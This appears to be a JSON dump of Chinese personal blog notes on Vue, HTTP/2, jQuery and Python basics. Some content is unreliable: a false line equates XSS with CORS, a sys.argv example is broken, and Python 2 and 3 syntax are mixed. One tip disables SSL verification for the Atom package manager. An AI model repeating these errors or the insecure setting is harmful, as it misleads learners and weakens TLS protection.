1.6各种引用在vue组件中this指的是当前的VueComponent（也就是常说的vm），self指的是window对象，this.$el指的是所渲染的template 1.7 嵌套路由破坏了静态资源的引用路径nested-routes-breaks-the-static-path解决方法是在 html中置顶css或js等静态资源的location，从绝对路径，根路径开始 2.使用Http进行CURD操作安装：Repo注意：需要在当前工作目录.安装完成在package.json中看到 &quot;dependencies&quot;: { &quot;vue&quot;: &quot;^2.3.3&quot;, &quot;Vue-resource&quot;:&quot;^1.3.4&quot; }, 类似这样即可。 2.1 进行POST操作jsonPlaceHolder是一个免费的API网站。vue-resource提交表单的操作如下: post:function () { //use http here this.$http.post(&#39;https://jsonplaceholder.typicode.com/posts&#39;,{ title:this.blog.title, body:this.blog.content, userId:1, }).then(function (data) { // body... console.log(data) this.summited = true }); } post方法返回的是一个promise，加回调即可打印出api返回结果。 3. Router,Eventbus,mixin，axios等安装: npm install vue-router –savenpm install vue-bus –save 3.1 关于Bus， 是用来在不同的Vue文件中传递事件(数据)用的，安装好后，main.js里面import并使用 import Vue from ‘vue’import VueBus from ‘vue-bus’;Vue.use(VueBus); A.vue中 created(){ this.$bus.emit(&#39;loadSuccess&#39;, &#39;创建成功！&#39;); }, beforedestory(){ this.$bus.off(&#39;loadSuccess&#39;) } // B.vue中 created(){ this.$bus.on(&#39;loadSuccess&#39;,text=&gt; { console.log(&#39;receieve msg from another vue component &#39;+ text) }) } 3.2 关于mixin，有比较好的介绍其实就是把一些公用的methods放到一个js文件中export掉，然后需要的vue文件，自己去import，在data中设置mixins: [] ,使用的时候就可以用this.method()使用这些共有的方法了。其实主要是为了复用。 3.3 添加全局变量(常量)的方法，vuex是官方的 3.4 router就是建立internal link 页面之间跳转的桥梁在template中添加router-link的tag,会生成一个对应的a Tag,点击跳转即可。router-view标签表示预先准备好的布局会被渲染进入这个标签内（将其取代） 3.5 axios取代vue-resource用于发起http请求安装在官方介绍页有，子组件可以使用import从mainjs里面拿到。回到axios，作者表示不打算支持jsonp，想用jsonp的话可以用jquery,或者使用jsonp插件 $ npm install jsonp --save var jsonp = require(&#39;jsonp&#39;); jsonp(&#39;http://api.douban.com/v2/movie/top250&#39;, null, function (err, data) { if (err) { console.error(err.message); } else { console.log(data); } }); 亲测有效。 take aways: ##同源： $.ajax({ url:&quot;persons.json&quot;, success:function(data){ console.log(data); //ToDo.. } }); ##跨域： $.ajax({ url:&quot;http://www.B.com/open.php?callback=?&quot;, dataType:&quot;jsonp&quot;, success:function(data){ console.log(data); //ToDo.. } }); 其实一开始没有callback=?这些个东西的，http://www.B.com/open.js 这个链接就是一个简单的js foo({&quot;name&quot;:&quot;B&quot;,&quot;age&quot;:23}); 所以A网站往document里面写一个script之后，直接就执行了A网站的foo() function。 但假如B网站还对C网站提供服务，C网站说foo()这个方法名已经被占用了。所以B就约定，不管是A,B,C D哪家网站，想要调各自的什么方法自己传上来，B负责调用以下。因为jsonp只能是GET，所以只好放在queryParameters里面了。为什么叫callback的原因我也是最近才想清楚的上面那个callback不一定非要写callback，其实写什么都行，主要看对方网站是怎么定义的。就是对方这个链接是怎么拿这个url里面的queryParams的。 XSS注入就是利用了CORS 4. Vuex及状态管理在js眼中，一段json字符串就是一个object。这是vuex 中改变某项属性的代码： mutations: { increment (state, payload) { state.count += payload.amount } } store.commit(&#39;increment&#39;, { amount: 10 }) 两个花括号括起来的(json)，才是对象。这里，函数名叫做&#39;increment&#39;，传进去的payLoad即有效信息，是通过json转达的。 事件处理点击时会发生MouseEvent,如果想要获取这里面的一些属性，比如点击位置screenX,ScreenY这些，可以在html中绑定事件时，使用$event这个符号将事件传递到方法中。 基础复习 id和class的问题html tag的class，不同tag可以有相同的class，引用的时候用.classname来查找id这个tag唯一的，一个页面不能有两个tag有相同的id，引用的时候用#id来找一个是点，一个是# js 里面有一个promise的概念，和java8的一些流式理念有点像 关闭ESlint，Eslint实在是太严格了，有点妨碍开发效率 html中audio tag不识别本地文件，需要放在static文件下，放在src文件夹里就是404，一开始的时候我这么写”src=’../assets/赵雷-成都.mp3’”，死活放不出来，换成”file://“开头也不行，换成网易云音乐的http地址就好了。最后换成’static目录下’。终于放出来了，“让我掉下眼泪的是，简直日了X”，还蛮押韵的。 atom可以同时预览两个选项卡，右键,split right，用于copy and paste比较方便 css里面可以写”background-image: url(./somefile.png)”，就是相对路径的意思。 10.css里面的class继承是同时在一个tag里面添加class=”class_a class_b”，中间一个空格，需要什么拿什么 css分三种，外部样式表（写在另一个css文件里），内部样式表(写在header tag中)和内联样式表(写在单独的tag里面) 日常开发出错记录 Vue warn]: Property or method is not defined on the instance but referenced during render。原来是template里面的html某个元素里面调用了XXX，而这个XXX并没有在当前Vue实例中声明。 Cannot read property ‘state’ of undefined.这其实就是在vue component中访问this.$store ===undefines了，需要确保Vue的声明中// root instance new Vue({ // eslint-disable-line no-new el: &quot;#app&quot;, store, router, render: h =&gt; h(App) }) 3. tools,tangiable takeaways atom plugin ide-typescript sucks , after disable the plugin ,the autocomplete feature works againself. config atom behind a firewall : apm config set https-proxy https://127.0.0.1:1080apm config set strict-ssl false 官方的库 Vuex是负责全局状态管理的，参考 组件间通信的方式 参考 Vue JS 2 Tutorial github repo jsonPlaceHoder css Sass JavaScript 教程 ES6相关 css教程 widgets 2018 我所了解的 Vue 知识大全（一） 用vue写一个calculator的小demo","tags":[{"name":"前端","slug":"前端","permalink":"https://haldir65.github.io/tags/前端/"},{"name":"javaScript","slug":"javaScript","permalink":"https://haldir65.github.io/tags/javaScript/"},{"name":"Vue","slug":"Vue","permalink":"https://haldir65.github.io/tags/Vue/"}]},{"title":"http2笔记","date":"2017-09-01T06:52:35.000Z","path":"2017/09/01/2017-09-01-how-much-an-http-s-cost/","text":"http建立在tcp,ip基础上，tcp协议的可靠性意味着每次http请求都会分解为多次ip请求。很多出于book keeping的东西占用了实际发送数据的相当一部分，具体占用多少。由此顺便展开到http和tcp的基本关系。 大部分基于Hadi在2016年的演讲 1. Http的几个概念1.1 bandwidth和latency的概念bandwidth是指数据传输的速度上限（运营商设置），latency是物理距离限制的信号传递到达的时间(中美之间的延迟一般180ms左右，这是物理距离决定的)。 1.2 为什么http1.1差劲这是由于latency决定的，跟bandwidth无关。假设客户端和服务器之间存在一定带宽限制，随着带宽上限的提高，两者之间的传输速度趋于平衡。只有在路不够宽的时候，路的宽度才会成为交通的阻碍，如果路足够宽，那么通信双方的通信速度只和两者之间的物理距离有关。要命的是，每一次连接都受到延迟影响。 1.3 现代网站的复杂化程度使得网络请求越来越频繁http（超文本传输协议），最初设计的时候确实只需要传输一些固定的文字，可能只要一条连接就够了。随着现在网页越来越复杂，打开一个网页，在chrome里面能看到一瞬间请求的资源多达几十个甚至上百个。想象下，每条连接都会受到latency的影响，浪费的时间成倍数增长。webpagetest可以展示加载一个页面的过程中都发起了哪些请求，并以waterfall view的形式展示出来。比直接在chrome里面看更加直观。 1.4 ISO OSI Layer一共七层 Application (Http在这一层，但人们习惯把它当做第四层) Presentation Session Transport (Tcp在这) Network Link Physical Http本身是OK的，tcp为了确保可靠性，建立连接要三次握手，断开连接要四次挥手。真正有用的数据传输只在这两者之间。每次发起请求，都需要带上这些必要的数据传输。这里面还有Handshake，客户端每收到一个包，都要向服务端发Acknowledgement(ACK)。还有Flow Control(两端之间传输数据，实现并不知道两者之间的道路有多宽，所以先传100byte试试，一切ok在提到200byte，接着提到500byte,万一出现问题，退回到200byte,这就叫congestion)。Flow Control的存在是有道理，但却使得每一条连接都得从很小的传输速度进行尝试，这就造成了延迟的增大。 1.5 HTTP 0.9 始于 1991年0.9版本的Http还没有header,1996年的Http 1.0 加入了Header。但这种协议的设计初衷并不是为了现在这种一个网页带上300个请求的事实而设计的。 1999年，http 1.1 加入了Connection close（默认是Keep-Alive）。Keep-Alive的好处是Tcp连接不会在一个http请求结束之后就断开，也就没有三次握手这种东西了。 1.6 一些前人总结的优化技巧 Sigle connection (/index.html；style.css全都放在一个连接里面) Pipelining (一次性请求index.html以及style.css，这些东西全都放在一个请求里面)。这种方式的问题叫做 Head-of-line Blocking,由于tcp是可靠的协议，所以必须得等第一个请求的response回来，后续的请求才能执行。所以很多浏览器后来都放弃了对这种技术的支持。 于是人们开始一次性发出多个tcp请求。客户端能同时向一个host(不同host之间不影响)发起的请求最多6(不同浏览器数量不同)到8个。这么干的原因一方面是客户端自我保护，另一方面也是为了保护服务器不至于崩溃。具体在知乎上有讨论所以我们经常看到知乎把api数据放在zhihu.com上，图片放在zhimg.com,统计放在zhstatic.com上。有时候还会有pic2.zhimg.com，pic3.zhimg.com。。。等等这些，还不是为了加快网页加载速度。(这就叫domain Sharding)，这么干也有坏处，More DNS lookups。找dns花的时间多了。 Inline resources直接把图片放在html里面传回来，这造成缓存失效。还有编码的问题 Concatenating and Spriting resourcesConcatenating是把所有的js文件塞在一个大的js里面返回，这也造成缓存失效，处理缓慢等问题。Spriting是把一大堆图片放在一整张图片里面，通过复杂的css选择其中的图片。 管道和多路复用 2. http2的开始Http有点像一种谈话式的协议，但tcp并不是。http并没有什么错,慢就慢在tcphttp2的一些要点如下 Binary Communication(http1.X 就是往socket里面写文字，h2直接写binary， 解析binary的速度要比解析文字快) Compression and optimization techniques(GZip没法压header，h2压缩了header) No change in HTTP semantics(主要是为了backward compatibility，GET,POST这些都没变) Not compatible with HTTP1.X but can be used ontop of it 2.1 SPDY谷歌设计了SPDY，h2建立在SPDY的基础上，google已经废弃了SPDY,据说是为了给h2让路。 2.2 h2过程h2传输的是Binary Frame，这里面包括HEADER FRAME和DATA FRAME, request的body和response的body都通过DATA FRAME传输。client发起一个请求，header里面包括(Upgrade:2c),一切OK的话，服务器返回一个status code 101(switching Protocol)。在response header里面返回一个Upgrade: h2c。 2.3 TLS ,SSL用于两点间传输binary数据TLS(Transport Layer Security),SSL(Secure Sockets Layer)ALPN(Application Level Protcol Negotitation) 2.4 数据传输的模型h2只有一条connection，里面有多个STREAM，STREAM里面包括了Request的HEADER FRAME和DATA FRAME以及Response的HEADER FRAME和DATA FRAME。FRAME里面有length,Type，Flags,ID(有了ID就能有sequence,也就能multiplexing，多路复用)以及Payload(数据)。FRAME TYPE有很多种，DATA,HEADER,WINDOW_UPDATE,SETTING，GOAWAY,这些在okhttp里面都能看到.用WireShark可以查看h2为什么快，Multiplexing，多路复用允许同时通过单一的 HTTP/2 连接发起多重的请求-响应消息 2.5 Header Compression本来GZip是不能压缩Header的，h2使用HPACK(很复杂的协议)，讲header(无非是键值对)中的key,value映射一份表，所以每一次发起请求，h2会将那些header变成数字，同时，只会发送改变了的header。（应用层无需关心，十分复杂） 2.6 Streams可以设置优先级都是在一条Connection中发送出去，开发者可以设置，例如，js优先级高点，image优先级低一点。 2.7 Flow Control Multiplexing requires ability of flow control WINDOW_UPDATE 2.8 Server Push客户端请求一个网页如 index.html，服务器会觉得，客户端很有可能还想要style.css和script.js。于是顺带着也给丢过来了。server push大致如此。这样的好处就是，client无需发起请求，省了流量。同时，client还可以说GO_AWAY,也就是拒绝SERVER的push。 3.现状现在很多网站已经支持了h2，twitter好像就是。一个很简单的方法就是看chrome里面的network，h2只有一条线。服务器这边，Ngnix 1.9.5支持h2，Apache 2.4.12开始支持客户端这边 Netty,OkHttp,Curl 都行进入h2，domain sharding,Concatenation and Spriting,InLining这些techniques都没有意义了。 演示 Update With 100Mbit/s Ethernet, a large file transfers at 94.1Mbit/s. That’s 6% overhead.所以本地记录的下载到的文件的速度要比运营商报告的实际带宽小一点，当然这只是一部分原因。 看看一个TCP包除了数据之外还塞了写哪些bookKeeping的东西当···时发生了什么使用套接字当浏览器得到了目标服务器的 IP 地址，以及 URL 中给出来端口号（http 协议默认端口号是 80， https 默认端口号是 443），它会调用系统库函数 socket ，请求一个 TCP流套接字，对应的参数是 AF_INET/AF_INET6 和 SOCK_STREAM 。 这个请求首先被交给传输层，在传输层请求被封装成 TCP segment。目标端口会被加入头部，源端口会在系统内核的动态端口范围内选取（Linux下是ip_local_port_range)TCP segment 被送往网络层，网络层会在其中再加入一个 IP 头部，里面包含了目标服务器的IP地址以及本机的IP地址，把它封装成一个IP packet。这个 TCP packet 接下来会进入链路层，链路层会在封包中加入 frame 头部，里面包含了本地内置网卡的MAC地址以及网关（本地路由器）的 MAC 地址。像前面说的一样，如果内核不知道网关的 MAC 地址，它必须进行 ARP 广播来查询其地址。到了现在，TCP 封包已经准备好了，可以使用下面的方式进行传输： 参考 what-of-traffic-is-network-overhead-on-top-of-http-s-requests Hadi Hariri — HTTP/2 – What do I need to know? WEB加速，协议先行腾讯技术工程事业群基础架构部高级工程师lancelot演讲 HTTP 2.0: why and how by Simone Bordet HTTP1.1中的一些优化策略失效 O’Reilly HTTP/2 Flow control 浏览器对同一ip进行请求的最大并发连接数是不一样的：IE11 、IE10 、chrome、Firefox 的并发连接数是 6个，IE9是10个。。","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"jQuery手册","date":"2017-08-27T21:48:52.000Z","path":"2017/08/27/2017-08-27-jquery-stuff/","text":"jQuery是一个dom manipulate library，非常大。jQuery能干的事情包括： html 的元素选取 html的元素操作 html dom遍历和修改 js特效和动画效果 css操作 html事件操作 ajax异步请求方式,etc 1.安装1.1 使用微软或者谷歌的CDN,放在head tag里面这样做的好处是别的网站已经加载过的js文件可以直接读缓存，加快加载速度其实自己下载一份，用src引用也行 &lt;head&gt; &lt;script src=&quot;http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.8.0.js&quot;&gt; &lt;/script&gt; &lt;/head&gt; 这一段必须放在head里面，用自己的src或者微软，谷歌的cdn都可以。如果自己的js文件引用到了jQuery，需要把jQuery写在其他js前面 这之后，在console中输入&gt;window.jQueryƒ (a,b){return new r.fn.init(a,b)} 显然是已经注册了全局常量 2. 使用npm和express yarn add jquery express 然后在app.js中 app.use(&#39;/jquery&#39;, express.static(__dirname + &#39;/node_modules/jquery/dist/&#39;)); 在html里 &lt;script src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; 1.1所有的jQuery函数都放在ready里面这一段script放在body后面也行，放在head里面也行 $(document).ready(function(){ --- jQuery functions go here ---- }); 基本上就是window渲染完毕之后开始做一些事情，随便抄了一段知乎首页的Button这里面双引号(“”)和单引号(‘’)都行 $(&#39;button#button1&#39;).css(&quot;background-color&quot;,&quot;#0f88eb&quot;) .css(&#39;border-radius&#39;,&#39;8px&#39;).css(&#39;padding-right&#39;,&#39;14px&#39;) .css(&#39;padding-left&#39;,&#39;14px&#39;).css(&#39;color&#39;,&#39;white&#39;) .css(&#39;line-height&#39;,&#39;30px&#39;) 前提是body里面放了一个class = button1 的button tag.这里只是改变了按钮的css样式，jQuery选择器有一些规则需要记住，主要就是如何选择html中的元素 $(this)表示当前html对象 $(‘p’)表示所以标签 $(‘p.intro’)表示所有class为intro的标签 $(‘.intro’)表示所有class为intro的标签 $(‘#intro’)表示所有id为intro的元素 $（’div#intro.head’) 所有id= ‘intro’的div中，找到class为’head’的元素 1.2 常用函数在script tag里面添加这一段，因为比对框架可能使用了$符号，为避免冲突，用var替代$符号 var jq=jQuery.noConflict()， 1.3 selector怎么写写一个tag，后面要么写id=’’，要么写class = ‘’，id要用”#”查找，class要用’.’查找。所以 文字 这种id是不会有响应的 1.4 还可以加事件回调可以在事件后面加回调，例如 jq(&#39;.click_btn&#39;).slideUp(300) //可以认为第二个参数是一个function jq(&#39;.click_btn&#39;).slideUp(300,function { alert(&#39;this will invoke after slideup finished&#39;) }) 可以自己写函数，可以引用之前定义的函数。当然函数回调里面还可以加回调，当然会有callback hell。简单的解决方式，把作为第二个参数的函数提取成一个函数，引用函数名作为参数传进去就好了。另外，在js里面var myFunction = function(){//stuff }是完全成立的，函数也是var。 Todo 去复制一大堆文字，button，img的css样式，修改，继承，引用。手写实在太慢 jQuery插件 fx queue TakeAway jQuery必须写在最前面，如果网页中还有其他的js引用到了jQuery的话","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"},{"name":"jQuery","slug":"jQuery","permalink":"https://haldir65.github.io/tags/jQuery/"},{"name":"前端","slug":"前端","permalink":"https://haldir65.github.io/tags/前端/"}]},{"title":"Python工具手册","date":"2017-08-24T22:25:18.000Z","path":"2017/08/24/2017-08-24-python-cookbook/","text":"苦海无涯，Python是岸 1. 基本数据操作，及语法 函数参数默认参数、可变参数、关键字参数等 集合类型(list是中括号，tuple是小括号) unicodeError 面向对象 多线程，多进程多线程基本无用，基本语法很简单：```pythonimport threading def readIo() print(‘do stuff heavy’) for i in range(10): threading.Thread(target=readIo).start()print(‘Finishing up’) ## 2. Flask相关 ### 2.1 Flask Admin Pannel[Flask-Admin中文入门教程](http://flask123.sinaapp.com/article/57/)Please run on linux ### 2.2.log上颜色 [博客](https://blog.phpgao.com/python_colorful_log.html)，Pycharm的console无效，内置Terminal有效 ### 2.7 [小Web](http://www.jianshu.com/p/f9d668490bc6) dict的创建方法[参考](https://www.linuxzen.com/python-you-ya-de-cao-zuo-zi-dian.html) ```python &gt;&gt;&gt; info = {&quot;name&quot; : &#39;cold&#39;} &gt;&gt;&gt; info = dict(name = &#39;cold&#39;) # 更优雅,注意这里的key不需要带双引号了 操作数据库的话，在python文件里面写sql语句也行。sqlite3还是官方自带包，mysql要装个包。但是实际开发中应该大多数都使用orm框架，很少会自己去写sql语句吧. orm(object relation mapping)框架： sqlalchemy pip install sqlalchemy python cheetsheet 2 .sys.args[]的使用，读取用户输入cmd中 python Python 3.6.1 (v3.6.1:69c0db5, Mar 21 2017, 17:54:52) [MSC v.1900 32 bit (Intel)] on win32Type “help”, “copyright”, “credits” or “license” for more information. 退出方式 ctrl+Z 切换到脚本所在目录 ,例如test.py #!/usr/bin/env python3 # -*- coding: utf-8 -*- import sys # sys.argv接收参数，第一个参数是文件名，第二个参数开始是用户输入的参数，以空格隔开 # cmd到该文件位置 def run1(): print(&#39;I\\&#39;m action1&#39;) def run2(): print(&#39;I\\&#39;m action2&#39;) if 2 &gt; len(sys.argv): print(&#39;none&#39;) else: action1 = sys.argv[0] action2 = sys.argv[1] if &#39;run1&#39; == action1: run1() if &#39;run2&#39; == action2: run2() print(action1) print(action2) 输入 python test.py run1输出 test.py ‘run1’ 2.3 Pycharm里面import各种can’t resolve 的解决方法 from werkzeug import secure_filename from werkzeug.utils import secure_filename只是因为这个文件的包的位置挪了，import只能用绝对路径 在class中调用parent class的方法 class Grandparent(object): def my_method(self): print &quot;Grandparent&quot; class Parent(Grandparent): def my_method(self): print &quot;Parent&quot; class Child(Parent): def my_method(self): print &quot;Hello Grandparent&quot; super(Parent, self).my_method() 3. Error Handlingtry except是可以拿到exception的原因的 try: 1 + &#39;1&#39; f = open(&#39;该文档不存在&#39;) print(f.read()) f.close() except OSError as reason: print(&#39;文件出错了T_T&#39;) print(&#39;出错原因是%s&#39;%str(reason)) except TypeError as reason: print(&#39;求和出错了T_T&#39;) print(&#39;出错原因是%s&#39;%str(reason)) 时间的函数有datetime和time包datetime在windows上和在mac上有表现不一致的现象python-time-formatting-different-in-windows亲测下来, import datetime dt = datetime.datetime.now() expire_time = dt.strftime(&#39;%s&#39;) ## 亲测，mac上没问题,windows上会崩,把s改成S就不会在windows上崩了。 ## 后来干脆改成这样 expire = int(round(dt.timestamp())) 时间相关的操作在这里： import datetime datetime.now().strftime(&quot;%Y年-%m月-%d日 %H %m %S&quot;) ## &#39;2018年-07月-03日 11 07 34&#39; ### 明天 tomorrow = datetime.date.today() + datetime.timedelta(days=1) ## 要是传个-1就是昨天了 ## 这个获取的是一个datetime.date对象 ## 来看看这个datatime.date对象能干嘛吧 tomorrow.year ##2018 tomorrow.day #4 tomorrow.ctime() ## &#39;Wed Jul 4 00:00:00 2018&#39; &gt;&gt;&gt; tomorrow.isoformat() &#39;2018-07-04&#39; 如何创建一个datetime.date对象： &gt;&gt;&gt; someday = datetime.datetime(2015,7,23,0,0) &gt;&gt;&gt; someday datetime.datetime(2015, 7, 23, 0, 0) &gt;&gt;&gt; someday.day 23 &gt;&gt;&gt; someday.month 7 &gt;&gt;&gt; someday.year 2015 今天是周几啊 &gt;&gt;&gt; someday.isoweekday() 4 ##周四，看了下日历，确实是周四 someday = datetime.datetime.strptime(&quot;2015-10-1 18:20:31&quot;,&quot;%Y-%m-%d %H:%M:%S&quot;) &gt;&gt;&gt; someday datetime.datetime(2015, 10, 1, 18, 20, 31) ##timetuple的概念 &gt;&gt;&gt; someday.timetuple() time.struct_time(tm_year=2015, tm_mon=10, tm_mday=1, tm_hour=18, tm_min=20, tm_sec=31, tm_wday=3, tm_yday=274, tm_isdst=-1) ## 这个struct也是能用的 &gt;&gt;&gt; someday.timetuple().tm_year 2015 ## 纯粹想要获得时间戳可以用这个 import time &gt;&gt;&gt; time.time() 1530587669.796551 ##注意这个获得的是秒为单位的 ##这种方式也能获得时间戳 &gt;&gt;&gt; timestamp = time.mktime(datetime.datetime.now().timetuple()) &gt;&gt;&gt; timestamp 1530588755.0 ##有了时间戳想要转回object: &gt;&gt;&gt;time.gmtime(timestamp) time.struct_time(tm_year=2018, tm_mon=7, tm_mday=3, tm_hour=3, tm_min=32, tm_sec=55, tm_wday=1, tm_yday=184, tm_isdst=0) ##fromtimestamp也行 &gt;&gt;&gt; datetime.datetime.fromtimestamp(time.time()) datetime.datetime(2018, 7, 3, 11, 36, 53, 58164) ## 然而datetime包下面还有一个 &gt;&gt;&gt; datetime.time &lt;class &#39;datetime.time&#39;&gt; &gt;&gt;&gt; from datetime import datetime print(datetime.now()) 2018-07-11 17:47:01.109458 &gt;&gt;&gt; print(datetime.utcnow()) 2018-07-11 09:47:09.212414 自带的Log使用, 注意默认的情况下是不打印出info的信息的，需要设置一下level(默认的是WARNING) import logging # create logger logging.basicConfig(level=logging.DEBUG, format=&#39;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#39;) logger = logging.getLogger(__name__) # 下面这两段也可以 # logging.basicConfig() # logging.getLogger().setLevel(logging.DEBUG) def main(): logger.info(&#39;This is a log info&#39;) logger.debug(&#39;Debugging&#39;) logger.warning(&#39;Warning exists&#39;) logger.info(&#39;Finish&#39;) pass if __name__ == &quot;__main__&quot;: main() 下划线的意义很多种这其中就包含了magic_method，或者dunder class. 直接看吧。 ## 一般__init__是写一个class时经常用到的方法，但其实还有一个__new__的方法 ## 当调用x = SomeClass()的时候，__init__并不是第一个被调用的方法，实际上还有一个 ## __new__方法，__new__方法是用来创建类病返回这个类的实例，而__init__只是拿着传入的参数来初始化这个实例 http://python.jobbole.com/88367/ ##在对象生命周期调用结束时，__del__ 方法会被调用，可以在这里释放资源 class MyDict(object): def __init__(self): print&#39;call fun __init__&#39; self.item = {} def __getitem__(self,key): print&#39;call fun __getItem__&#39; return self.item.get(key) def __setitem__(self,key,value): print&#39;call fun __setItem__&#39; self.item[key] =value def __delitem__(self,key): print&#39;cal fun __delitem__&#39; del self.item[key] def __len__(self): returnlen(self.item) 上面这些主要是创建类似于dict或者映射的类，可以像操作字典一样进行使用 myDict = MyDict() myDict[2] = &#39;ch&#39; ##会调用到__setitem__方法 del myDict[2] ##会调用到__delitem方法，其实也等于对外提供了一个钩子 __getattr__(self, name)： ## python不支持私有变量，但其实可以在这里去拦截 ## 定义当用户试图获取一个不存在的属性时的行为。这适用于对普通拼写错误的获取和重定向，对获取一些不建议的属性时候给出警告(如果你愿意你也可以计算并且给出一个值)或者处理一个 AttributeError 。只有当调用不存在的属性的时候会被返回。 pass ##__getattribute__定义了你的属性被访问时的行为，相比较，__getattr__只有该属性不存在时才会起作用。因此，在支持__getattribute__的Python版本,调用__getattr__前必定会调用 __getattribute__。__getattribute__同样要避免”无限递归”的错误。需要提醒的是，最好不要尝试去实现__getattribute__,因为很少见到这种做法，而且很容易出bug。 # 错误用法，因为会导致无限递归 def __setattr__(self, name, value): self.name = value # 每当属性被赋值的时候(如self.name = value)， ``__setattr__()`` 会被调用，这样就造成了递归调用。 # 这意味这会调用 ``self.__setattr__(&#39;name&#39;, value)`` ，每次方法会调用自己。这样会造成程序崩溃。 # 正确用法 def __setattr__(self, name, value): self.__dict__[name] = value # 给类中的属性名分配值 ## __dict__是 A dictionary or other mapping object used to store an object’s (writable) attributes. # 定制特有属性 关于dict： def func(): pass func.temp = 1 ## in python , everything is an object,everything ! print func.__dict__ class TempClass(object): a = 1 def tempFunction(self): pass print TempClass.__dict__ {‘temp’: 1}{‘a’: 1, ‘module‘: ‘main‘, ‘tempFunction’: , ‘dict‘: , ‘weakref‘: , ‘doc‘: None} 底层应该是和descriptor相关以及dict.dict还有slots 一些比较常见的magic method: def __init__(self): pass def __del__(self): pass def __call__(self,*args):## 实现了这个方法，外部调用callable(instance)就返回True，表示这个instance是可以instance()这么用的 pass 关于magic method的详解比较好的文章 python descriptor就是在存取变量的时候做一个hook class RevealAccess(object): def __init__(self, initval=None, name=&#39;var&#39;): self.val = initval self.name = name def __get__(self, obj, objtype): print &#39;Retrieving&#39;, self.name return self.val def __set__(self, obj, val): print &#39;Updating&#39; , self.name self.val = val class MyClass(object): x = RevealAccess(10, &#39;var &quot;x&quot;&#39;) y = 5 m = MyClass() ##个人感觉这个descriptor是把原始的value包装了一层，在get和set的时候去拦截一下 ## 这么说吧，就是调用到descriptorinstance的时候，会走到这个class的__get__方法 m.x Retrieving var &quot;x&quot; 10 m.x = 20 Updating var &quot;x&quot; m.x Retrieving var &quot;x&quot; 20 m.y 5 这个RevealAccess的对象就是一个descriptor，其作用就是在存取变量的时候做了一个hook。访问属性m.x就是调用get方法，设置属性值就是调用set方法。还可以有一个delete方法，在del m.x时被调用。 只要一个类定义了以上三种方法，其对象就是一个descriptor。我们把同时定义get和set方法的descriptor叫做data descriptor，把只定义get方法的叫non-data descriptor 一些比较实用的魔术方法比方说： infos = [1,2,3] info2 = [1,2,3] ## 这俩其实干了同一件事 &gt;&gt;&gt; infos&lt;=info2 True &gt;&gt;&gt; infos.__le__(info2) True ## 第一个其实调用了第二个 len(infos) 3 &gt;&gt;&gt; infos.__len__() 3 ## 这就很广泛了 &gt;&gt;&gt; site = &#39;http://www.outofmemory.cn/&#39; &gt;&gt;&gt; &quot;www&quot; in site True &gt;&gt;&gt; site.find(&quot;www&quot;) 7 ##现在觉得还去写str.__contains__(&quot;something&quot;)确实啰嗦了 hasattr和getattr方法 class Example(): def __init__(self): self.name = &quot;example stuff&quot; def prints(self,*args,**kwargs): print(&#39;stuffs&#39;) def main(): pass ex = Example() name_exists = hasattr(ex,&quot;name&quot;) print(&quot; Example has attribute %s&quot; % hasattr(ex,&quot;name&quot;)) ## True print(&quot;Example has function %s&quot; % hasattr(ex,&quot;prints&quot;)) ## True f = getattr(ex,&quot;prints&quot;) f() fakeattr = getattr(ex,&quot;no_existing_attr&quot;,None) ## 还可以设置一个找不到的时候的默认值 class Post(db.Model): title = db.Column(db.String(80), nullable=False) def __repr__(self): return &#39;&lt;Post %r&gt;&#39; % self.title repr()就是在print的时候打印出的内容，和django里面model的str方法差不多 最后补上一条(一个下划线开头的变量通常是说这个变量是private的意思),python并不存在private这种访问限制，所以所有的变量都是全局可访问的。这个并不是官方语法，只是一种convention罢了 “Private” instance variables that cannot be accessed except from inside an object don’t exist in Python. However, there is a convention that is followed by most Python code: a name prefixed with an underscore (e.g. _spam) should be treated as a non-public part of the API (whether it is a function, a method or a data member). It should be considered an implementation detail and subject to change without notice. python-class-with-double-underscorePython Underscore Methods isinstance和type的区别,isinstance要好一点 class A: pass class B(A): pass isinstance(A(), A) # returns True type(A()) == A # returns True isinstance(B(), A) # returns True type(B()) == A # returns False ，type判断不了一个子类是不是其父类 isinstance(instance,类型)，这第二个参数可选值包括str,int,long,float,list,tuple,dict &gt;&gt;&gt;a = 2 &gt;&gt;&gt; isinstance (a,int) True &gt;&gt;&gt; isinstance (a,str) False &gt;&gt;&gt; isinstance (a,(str,int,list)) # 是元组中的一个返回 True True &gt;&gt;&gt; num = 3 &gt;&gt;&gt; num.__class__.__name__ &#39;int&#39; ##isinstance这后面的第二个参数就是这么来的 try except是可以catch住import error的 try: from _foo import * except ImportError: raise ImportError(&#39;&lt;any message you want here&gt;&#39;) 很多开源库都提供了setup.py的安装方式： $ git clone https://github.com/user/foo $ cd foo $ python setup.py install pip freeze | xargs pip uninstall -y ## 在venv下，删除所有安装的pip包pip freeze &gt; requirements.txt ## 生成requirements.txt十分简单pip install -r requirements.txt 安装依赖也十分简单 //然而2018年python社区已经开始推广pipenv了，技术变迁实在是太快。Kenneth Reitz - Pipenv: The Future of Python Dependency Management - PyCon 2018 json这个库obj -&gt; string 用dumps，string -&gt; obj用json.loads(string) 。 还有就是json标准语法是不允许单引号的。json.dumps()这个函数，对于自定义的class类型，需要提供一个default参数 class User(db.Model): id = db.Column(db.Integer, primary_key=True,autoincrement = True) username = db.Column(db.String(80), unique=False, nullable=False) email = db.Column(db.String(120), unique=False, nullable=False) def __repr__(self): return &#39;&lt;User %r&gt;&#39; % self.username ## 这个方法是给json.dumps使用的，classmethod在被调用的时候默认会在前面添加一个class对象(不是class实例) @classmethod def serialize(cls,_usr): return { &quot;id&quot;: _usr.id, &quot;username&quot;: _usr.username, &quot;email&quot;: _usr.email } @app.route(&#39;/users/all&#39;) def all_users(): # user = User.query.filter_by(username=username).first_or_404() # return render_template(&#39;show_user.html&#39;, user=user) user_ = {&#39;name&#39;:user.username,&#39;email&#39;:user.email} ## peter = User.query.filter_by(username=&#39;peter&#39;).first() ##missing = User.query.filter_by(username=&#39;missing&#39;).first() all_users = User.query.filter(User.email.endswith(&#39;@example.com&#39;)).all() ## all_user的类型是list # User.query.order_by(User.username).all() # User.query.limit(1).all() # User.query.get(1) result = None try: ## 对于自定义的class类型，需要告诉json如何去序列化 result = json.dumps(all_users,default=User.serialize) 